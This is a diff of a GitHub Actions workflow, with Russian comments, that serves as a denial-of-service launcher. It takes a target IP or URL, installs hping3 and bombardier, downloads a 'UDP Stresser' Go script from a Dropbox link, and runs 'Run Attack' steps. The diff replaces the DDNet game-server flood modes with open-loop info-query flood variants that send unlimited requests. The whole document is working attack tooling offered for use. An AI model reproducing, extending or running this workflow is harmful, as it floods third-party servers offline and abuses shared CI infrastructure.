@@ -12,9 +12,9 @@ on:
           - http
           - tcp
           - udp
-          - udp-ddnet-info
-          - udp-ddnet-connect
-          - udp-ddnet-accept
+          - udp-ddnet-vanilla
+          - udp-ddnet-extended
+          - udp-ddnet-legacy64
 
       target:
         description: 'IP или URL (например: 1.1.1.1 или https://google.com)'
@@ -48,14 +48,13 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y hping3 golang-go wget curl
-          # Скачиваем bombardier
           wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
           chmod +x bombardier-linux-amd64
           sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
 
       - name: Download Bombarida (UDP Stresser)
         run: |
-          wget -O bombarida.go "https://www.dropbox.com/scl/fi/658xof4jxtey8tgaqq4nh/bombarida.go?rlkey=7vn1h1iohtm9c23d3wq150nwu&st=oxsub6i0&dl=1"
+          wget -O bombarida.go "https://www.dropbox.com/scl/fi/2wsx39z5k7cswuhgb2u2i/bombarida.go?rlkey=6h3za0sbnhn539j25s9il7xw4&st=70gr9sew&dl=1"
 
       - name: Run Attack
         run: |
@@ -81,18 +80,21 @@ jobs:
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
               -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
 
-          elif [ "$METHOD" == "udp-ddnet-info" ]; then
-            echo "Запуск UDP DDNet (get info)"
+          elif [ "$METHOD" == "udp-ddnet-vanilla" ]; then
+            echo "Запуск UDP DDNet (get info vanilla)"
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -ddnet-info -open-loop -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
+              -ddnet-info -ddnet-info-kind vanilla -open-loop \
+              -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
 
-          elif [ "$METHOD" == "udp-ddnet-connect" ]; then
-            echo "Запуск UDP DDNet (connect only)"
+          elif [ "$METHOD" == "udp-ddnet-extended" ]; then
+            echo "Запуск UDP DDNet (get info extended)"
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -ddnet-connect -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
+              -ddnet-info -ddnet-info-kind extended -open-loop \
+              -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
 
-          elif [ "$METHOD" == "udp-ddnet-accept" ]; then
-            echo "Запуск UDP DDNet (connect/accept churn)"
+          elif [ "$METHOD" == "udp-ddnet-legacy64" ]; then
+            echo "Запуск UDP DDNet (get info legacy64)"
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -ddnet-accept -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
+              -ddnet-info -ddnet-info-kind legacy64 -open-loop \
+              -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
           fi
